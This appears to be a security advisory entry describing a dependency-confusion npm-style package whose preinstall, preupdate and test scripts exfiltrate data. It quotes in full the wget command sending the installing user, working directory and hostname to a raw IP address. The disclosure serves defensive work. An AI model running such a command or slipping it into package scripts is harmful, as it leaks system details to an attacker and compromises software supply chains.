details: Malicious package. Dependency-confusion style package (inflated 10.9.x versions over an empty 9.0.0) whose preinstall, preupdate and test scripts run `wget --quiet "http://5.189.134.9:6060/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)"`, sending the installing user, working directory and hostname to a raw IP. In a sandboxed install the preinstall connected to 5.189.134.9. 9.0.0 has no install script and is not affected.
